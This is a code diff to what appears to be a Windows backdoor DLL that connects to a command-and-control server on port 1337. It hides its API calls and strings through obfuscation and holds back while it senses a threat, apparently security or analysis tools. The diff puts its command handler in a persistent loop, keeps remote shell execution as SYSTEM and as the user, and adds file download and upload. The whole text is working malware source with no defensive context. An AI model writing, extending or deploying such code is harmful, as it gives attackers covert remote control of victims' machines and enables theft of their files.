@@ -51,26 +51,33 @@ void get_command(TCPClient* client) {
     free_library_and_exit_thread_type free_library_and_exit_thread = WINAPI_OBFUSCATE(free_library_and_exit_thread_type, "FreeLibraryAndExitThread", "kernel32");
     client->reconnect();
     create_thread(nullptr, 0, close_client_on_threats, client, 0, 0);
-    const auto data = client->receive(4);
-    switch ((*data)[0]) {
-    case 0: // ping
-        handle_ping_command(*client);
-        break;
-    case 1: // Execute shell as SYSTEM
-        handle_shell_command(*client);
-        break;
-    case 2: // Execute as user
-        handle_shell_command_as_user(*client);
-        break;
-    case 3: // Exit
-        free_library_and_exit_thread(get_module_handle(nullptr), 0);
-        break;
-    case 4:
-    default:
-        client->send_data(OBFUSCATE("Unknown command"));
-        break;
+    while (client->m_is_connected) {
+        const auto data = client->receive(4);
+        switch ((*data)[0]) {
+        case 0: // Exit
+            free_library_and_exit_thread(get_module_handle(nullptr), 0);
+            break;
+        case 1: // ping
+            handle_ping_command(*client);
+            break;
+        case 2: // Execute shell as SYSTEM
+            handle_shell_command(*client);
+            break;
+        case 3: // Execute as user
+            handle_shell_command_as_user(*client);
+            break;
+        case 4:
+            download_file(*client);
+            break;
+        case 5:
+            upload_file(*client);
+            break;
+        default:
+            client->send_data(OBFUSCATE("Unknown command"));
+            client->disconnect();
+            break;
+        }
     }
-
     client->disconnect();
 }
 
@@ -97,10 +104,13 @@ DWORD dll_main(LPVOID param) {
     TCPClient client(cnc_ip.c_str(), 1337);
     // Command handler:
     while (1) {
-        if (!is_there_a_threat()) {
-            get_command(&client);
+        try {
+            if (!is_there_a_threat()) {
+                get_command(&client);
+            }
+        } catch (...) {
+            sleep(1000 * SLEEP_BETWEEN_COMMANDS);
         }
-        sleep(1000 * SLEEP_BETWEEN_COMMANDS);
     }
     return 0;
 }
